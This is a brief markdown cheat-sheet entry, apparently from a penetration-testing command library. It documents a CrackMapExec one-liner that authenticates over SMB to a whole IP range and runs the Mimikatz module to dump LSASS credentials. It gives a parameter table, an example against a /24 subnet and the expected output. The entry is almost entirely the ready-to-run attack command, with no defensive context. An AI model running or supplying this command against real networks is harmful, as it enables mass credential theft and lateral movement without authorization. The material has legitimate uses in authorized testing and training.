---
type: command
executor: bash
data: cme smb $_NETWORK -u $_USER -p '$_PASSWORD' --local-auth -M mimikatz
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - smb
  - mimikatz
verified: true
validated: true
---

# cme-smb-mimikatz

## Command

```bash
cme smb $_NETWORK -u $_USER -p '$_PASSWORD' --local-auth -M mimikatz
```

## Description

Runs Mimikatz module across network range for credential dumping.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_NETWORK | IP range | Yes |
| -u $_USER | User | Yes |
| -p '$_PASSWORD' | Password | Yes |
| --local-auth | Local auth | Yes |
| -M mimikatz | Module | Yes |

## Examples

### Basic Usage

```bash
cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
```

## Expected Output

Dumped hashes: "Privilege::Debug enabled, LSASS dumped".

## Related

- [[tools/CrackMapExec]]
